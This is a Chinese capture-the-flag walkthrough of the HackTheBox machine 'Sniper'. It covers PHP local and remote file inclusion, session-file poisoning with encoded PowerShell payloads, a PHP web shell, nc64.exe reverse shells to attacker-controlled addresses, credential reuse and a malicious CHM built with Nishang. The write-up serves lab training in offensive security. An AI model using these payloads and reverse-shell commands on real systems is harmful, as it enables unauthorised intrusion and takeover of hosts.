Sniper是一个中等难度的靶机，知识点涉及本地文件包含利用、远程文件包含利用、凭证制作、恶意chm文件利用等。感兴趣的同学可以在HackTheBox中进行学习。

![截屏2022-03-04
下午3.24.52](https://image.3001.net/images/20220310/1646901164_6229b7ac1c9d23a49e3c0.png!small)
_通关思维导图_  
![Json](https://image.3001.net/images/20220310/1646901166_6229b7aec821bedf86270.png!small)

## 0x01 侦查

### 端口探测

首先使用 nmap 进行端口扫描

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.151 -oA nmap_Sniper
    

![截屏2022-03-07
下午2.13.18](https://image.3001.net/images/20220310/1646901168_6229b7b086ad53ac5d743.png!small)

#### 80端口

访问后发现是一家名为 Sniper Co. 的公司，主要业务是快递  
![截屏2022-03-07
下午4.19.55](https://image.3001.net/images/20220310/1646901170_6229b7b23ec3970465ec4.png!small)

点击`Our servers`会跳转至`/blog/index.php`，点击`User Portal`会跳转至`/user/login.php`登陆界面

### 目录扫描

使用 gobuster 进行目录扫描

    
    
    gobuster dir -u http://10.10.10.151 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
    

![截屏2022-03-07
下午4.45.49](https://image.3001.net/images/20220310/1646901172_6229b7b400f43ed73cb8e.png!small)

#### blog

在博客中存在语言下拉框，分别是  
![截屏2022-03-07
下午4.47.53](https://image.3001.net/images/20220310/1646901173_6229b7b5007b9d2ca0e9e.png!small)

    
    
    http://10.10.10.151/blog/?lang=blog-en.php
    http://10.10.10.151/blog/?lang=blog-es.php
    http://10.10.10.151/blog/?lang=blog-fr.php
    

三种语言界面都在同一个目录中，可以判断它是通过 php 代码`include
$_GET['lang']`对其进行包含，如果过滤不严谨的话则可能存在文件包含漏洞

#### user

![截屏2022-03-07
下午4.53.17](https://image.3001.net/images/20220310/1646901174_6229b7b60f30b880b05df.png!small)  
在登陆界面下面有一个注册界面，尝试注册账户  
![截屏2022-03-07
下午5.28.17](https://image.3001.net/images/20220310/1646901175_6229b7b73c9454c0a13cf.png!small)  
使用新注册的账户 admin/admin 登陆其中  
![截屏2022-03-07
下午5.29.44](https://image.3001.net/images/20220310/1646901176_6229b7b86283ee8c1d8ba.png!small)

## 0x02 上线[iusr]

### 验证文件包含

#### 本地文件包含

首先尝试读取上次目录的`index.php`  
![截屏2022-03-07
下午5.33.23](https://image.3001.net/images/20220310/1646901177_6229b7b998a7887b085cb.png!small)  
显示无法读取，但是使用绝对路径`\windows\win.ini`则能够读取成功  
![截屏2022-03-08
上午11.34.03](https://image.3001.net/images/20220310/1646901178_6229b7bab51447e581f58.png!small)

#### 远程文件包含

使用 smbserver 在本地开启 smb 服务，并在该目录下放置一个文本文件`mac.txt`，内容为`mac is good`，

    
    
    python3 smbserver.py -smb2support mac ~/hackthebox/Machines/Sniper/
    

尝试请求远程文件地址：`\\10.10.14.7\mac\mac.txt`  
![截屏2022-03-08
下午2.49.55](https://image.3001.net/images/20220310/1646901179_6229b7bbd3880dfc3d9bb.png!small)成功请求到`mac.txt`当中的内容，查看响应发现靶机已向本地发送请求  
![截屏2022-03-08
下午2.50.10](https://image.3001.net/images/20220310/1646901180_6229b7bce1af2d0b93cf7.png!small)如果
smb 服务建立出现问题也可以使用以下方式

    
    
    vim /etc/samba/smb.conf
    
    
    
    [mac]
        path = /root/hackthebox/Machines/Sniper/
        browseable = yes
        read only = no
        create mask = 777
        guest ok = yes
        force user = nobody
        force group = nogroup
    

![截屏2022-03-08
下午4.30.38](https://image.3001.net/images/20220310/1646901182_6229b7be983688348f06d.png!small)开启服务

    
    
    service smbd restart
    service nmbd restart
    

### 本地文件包含上线

在 Windows 中默认会话地址是`\windows\temp`目录，登陆账户后我们可以获取到 PHPSESSID
为`8b23pbv8tj4m02qisnape584d8`  
![截屏2022-03-08
下午3.14.44](https://image.3001.net/images/20220310/1646901183_6229b7bfb408a5c4eb383.png!small)  
这样我们就能够推断 PHP 会话文件为`\windows\temp\sess_8b23pbv8tj4m02qisnape584d8`  
![截屏2022-03-08
下午3.30.31](https://image.3001.net/images/20220310/1646901184_6229b7c0d7dd859256f69.png!small)接下来尝试在注册界面中的用户名中写入
PHP 执行代码

    
    
    <?php system("whoami")?>
    

虽然能够成功注册，但是无法成功登陆  
![截屏2022-03-08
下午3.33.14](https://image.3001.net/images/20220310/1646901186_6229b7c20d14223afc9ec.png!small)  
可能在后端代码中存在一些注入，尝试混淆语句

    
    
    a<?php echo `whoami` ?>b
    

成功登陆后请求会话文件发现命令执行成功  
![截屏2022-03-08
下午3.35.48](https://image.3001.net/images/20220310/1646901187_6229b7c3244fd21772de5.png!small)尝试获取站点下的`user`目录文件来了解`registration.php`的过滤规则，网站默认路径为`\\inetpub\\wwwroot`

    
    
    a<?php echo `dir \\inetpub\\wwwroot\\user` ?>b
    

![截屏2022-03-08
下午3.40.35](https://image.3001.net/images/20220310/1646901188_6229b7c44859916421d98.png!small)在读取`registration.php`时遇到了问题，`.`字符导致内容无法回显，使用`*`替代拿到该文件的源代码

    
    
    a<?php echo `powershell cat \\inetpub\\wwwroot\\user\\registration*php` ?>b
    

![截屏2022-03-08
下午3.52.45](https://image.3001.net/images/20220310/1646901189_6229b7c57e56dd67f1561.png!small)黑名单中包含了字符`-$[(_.;&"\`，因此在命令中不能包含这些特殊字符，通过
base64 编码可以帮助我们绕过这些字符限制

    
    
    echo 'cmd /c "\\10.10.14.7\mac\nc64.exe -e cmd 10.10.14.7 443"' | iconv -f ascii -t utf-16le | base64 -w0
    

![截屏2022-03-08
下午4.04.17](https://image.3001.net/images/20220310/1646901190_6229b7c6b6ef9b761fba0.png!small)`/enc`会在执行命令时将
base64 解码，可注册为以下代码

    
    
    <?php echo `powershell /enc YwBtAGQAIAAvAGMAIAAiAFwAMQAwAC4AMQAwAC4AMQA0AC4ANwBcAG0AYQBjAAoAYwA2ADQALgBlAHgAZQAgAC0AZQAgAGMAbQBkACAAMQAwAC4AMQAwAC4AMQA0AC4ANwAgADQANAAzACIACgA=` ?>
    

在本地监听443端口

    
    
    rlwrap nc -nvlp 443
    

登陆成功后请求会话数据

    
    
    curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\windows\temp\sess_8b23pbv8tj4m02qisnape584d8'
    

但是并没有返回会话，甚至都没有请求 smb 服务，于是解码 base64 并与 0xdf 大神的编码进行对比  
![截屏2022-03-08
下午4.55.08](https://image.3001.net/images/20220310/1646901191_6229b7c7a137023fd519e.png!small)  
发现我的命令并不完整，原来是`\n`被转义了，需要重新编码

    
    
    YwBtAGQAIAAvAGMAIAAiAFwAXAAxADAALgAxADAALgAxADQALgA3AFwAbQBhAGMAXABuAGMANgA0AC4AZQB4AGUAIAAtAGUAIABjAG0AZAAgADEAMAAuADEAMAAuADEANAAuADcAIAA0ADQAMwAiAAoA
    

验证通过  
![截屏2022-03-08
下午5.28.53](https://image.3001.net/images/20220310/1646901192_6229b7c884ff46b11e5a7.png!small)再次在注册界面注册账户并请求会话数据

    
    
    <?php echo `powershell /enc YwBtAGQAIAAvAGMAIAAiAFwAXAAxADAALgAxADAALgAxADQALgA3AFwAbQBhAGMAXABuAGMANgA0AC4AZQB4AGUAIAAtAGUAIABjAG0AZAAgADEAMAAuADEAMAAuADEANAAuADcAIAA0ADQAMwAiAAoA` ?>
    

![截屏2022-03-10
上午9.10.36](https://image.3001.net/images/20220310/1646901193_6229b7c95cdf51dd2d18b.png!small)成功拿到反弹shell

### 远程文件包含上线

除了通过本地文件包含，我们还可以利用远程文件包含，比如包含一个简单的PHP小马

    
    
    <?php system($_REQUEST['cmd'])?>
    

可以请求一个包含 cmd 的参数进行验证

    
    
    curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\\10.10.14.5\mac\cmd.php' --data-urlencode 'cmd=whoami' | sed -n '/<\/html>/,/<\/body>/p'
    

![截屏2022-03-10
上午9.37.45](https://image.3001.net/images/20220310/1646901194_6229b7ca90289f1245407.png!small)  
成功执行命令，因此我们可以通过该shell执行反弹shell命令

    
    
    curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\\10.10.14.5\mac\cmd.php' --data-urlencode 'cmd=\\10.10.14.5\mac\nc64.exe -e cmd 10.10.14.5 4444'
    

在本地监听4444端口

    
    
    rlwrap nc -nvlp 4444
    

![截屏2022-03-10
上午9.51.33](https://image.3001.net/images/20220310/1646901195_6229b7cbc2eb3248d988a.png!small)成功反弹shell

## 0x03 权限提升[chris]

### 信息收集

在当前站点目录下发现数据库的认证信息

    
    
    type c:\inetpub\wwwroot\user\db.php
    

![截屏2022-03-10
上午10.04.33](https://image.3001.net/images/20220310/1646901196_6229b7ccd6f40df9846e9.png!small)  
其中密码为`36mEAhz/B8xQ~2VM`，与此同时发现用户`Chris`和管理员

    
    
    dir c:\Users\
    

![截屏2022-03-10
上午10.09.49](https://image.3001.net/images/20220310/1646901198_6229b7ce091c4ed20ead4.png!small)

### 获取凭据

有了账号密码就可以尝试通过 powershell 来运行他们的身份，首先查看主机名

    
    
    powershell
    PS > hostname
    

![截屏2022-03-10
上午10.36.34](https://image.3001.net/images/20220310/1646901198_6229b7cee9292bff30a0c.png!small)  
制作用户`Chris`的身份凭据

    
    
    PS > $user = "Sniper\Chris"
    PS > $pass = "36mEAhz/B8xQ~2VM"
    PS > $secstr = New-Object -TypeName System.Security.SecureString
    PS > $pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
    PS > $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
    PS > Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost
    

![截屏2022-03-10
上午10.48.24](https://image.3001.net/images/20220310/1646901199_6229b7cfd48a949a3f461.png!small)  
可以看到运行权限为`Chris`身份，查看用户`Chris`发现`Chris`属于远程管理用户组

    
    
    net user chris
    

![截屏2022-03-10
上午10.54.46](https://image.3001.net/images/20220310/1646901201_6229b7d10e96fc1edeb72.png!small)  
在当前用户桌面上获取第一个flag

    
    
    PS > Invoke-Command -ScriptBlock { dir c:\Users\chris\Desktop } -Credential $cred -Computer localhost
    PS > Invoke-Command -ScriptBlock { type c:\Users\chris\Desktop\user.txt } -Credential $cred -Computer localhost
    

![截屏2022-03-10
上午11.00.56](https://image.3001.net/images/20220310/1646901202_6229b7d248f4efeab2311.png!small)成功拿到第一个flag

### 反弹shell

借助本地的 nc 可以完成反弹shell

    
    
    PS > Invoke-Command -ScriptBlock { \\10.10.14.5\mac\nc64.exe -e cmd 10.10.14.5 5555 } -Credential $cred -Computer localhost
    

在本地监听5555端口

    
    
    rlwrap nc -nvlp 5555
    

![截屏2022-03-10
上午11.10.30](https://image.3001.net/images/20220310/1646901203_6229b7d352bc20c7ec973.png!small)  
成功拿到反弹shell

## 0x04 权限提升[administrator]

### 信息收集

在`C:\Docs`目录下存在几个文件

    
    
    cd C:\Docs
    dir
    

![截屏2022-03-10
上午11.12.40](https://image.3001.net/images/20220310/1646901204_6229b7d46b8063175d44b.png!small)  
查看`note.txt`，其中 CEO 要求 Chris 删除文档

    
    
    type note.txt
    

![截屏2022-03-10
上午11.13.35](https://image.3001.net/images/20220310/1646901205_6229b7d543a21c9a99b32.png!small)  
在当前用户的`Downloads`目录下存在`instructions.chm`

    
    
    cd c:\Users\Chris\Downloads\
    dir c:\Users\Chris\Downloads\
    

![截屏2022-03-10
上午11.15.56](https://image.3001.net/images/20220310/1646901206_6229b7d632aa6ec3ab165.png!small)`.chm`是
Windows 帮助文件，因此可能是 CEO 正在讨论的文档，将其复制到本地进行检查

    
    
    copy instructions.chm \\10.10.14.5\mac\instructions.chm
    

![截屏2018-03-10
上午11.35.53](https://image.3001.net/images/20220310/1646901207_6229b7d739be954e1cbe5.png!small)

### 恶意chm

Nishang 中的 Out-CHM.ps1 可以帮助我们在`.chm`文件中加载 payload 运行，首先在 Windows 中导入该文件

    
    
    Import-Module .\Out-CHM.ps1
    

调用`Out-CHM`传递`HTML Help Workshop`路径并加载 payloadc

    
    
    Out-CHM -Payload "\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.5 6666" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
    

在执行之前需要先安装`HTML Help Workshop`，否则会出现报错  
 **下载地址：https://www.helpandmanual.com/downloads_mscomp.html**  
![截屏2022-03-10
下午2.24.10](https://image.3001.net/images/20220310/1646901208_6229b7d88097b1c379f54.png!small)  
成功生成`doc.chm`

### 管理员上线

将`doc.chm`和`nc64.exe`复制到靶机当中

    
    
    copy \\10.10.14.5\mac\doc.chm .
    copy \\10.10.14.5\mac\nc64.exe \windows\system32\spool\drivers\color\nc64.exe
    

![截屏2022-03-10
下午2.38.40](https://image.3001.net/images/20220310/1646901212_6229b7dc36ae9996b9971.png!small)

同时开启监听

    
    
    rlwrap nc -nvlp 6666
    

![截屏2022-03-10
下午2.52.02](https://image.3001.net/images/20220310/1646901213_6229b7dd2683147e3094a.png!small)

成功拿到管理员权限，在管理员桌面哈桑寻找第二个flag

    
    
    dir c:\Users\administrator\Desktop
    type c:\Users\administrator\Desktop\root.txt
    

![截屏2022-03-10
下午2.56.26](https://image.3001.net/images/20220310/1646901214_6229b7de4d75fa2e92edf.png!small)

成功拿到第二个flag

## 总结

站点中存在两个重要的目录，分别为user和blog，blog目录在语言切换中使用?lang=xx.php，这很大程度上说明可能存在文件包含漏洞；user目录则用于用户注册和登陆账号，在之后的会话利用也帮助我们拿到了sessionid，从而确认了session地址。

文件包含漏洞验证成功后我们发现存在两种上线方式，一是本地文件包含利用，即通过包含session位置中注册用户名（PHP代码）来达到代码执行的效果；二是相对简单的远程文件包含利用，即只要在本地放置木马文件请求包含就可获取权限。

上线靶机后在其中找到数据库配置文件，里面存在密码，利用用户名和密码通过powershell制作凭证上线chris用户。最后使用nishang脚本Out-CHM生成恶意chm文件拿到管理员用户权限。

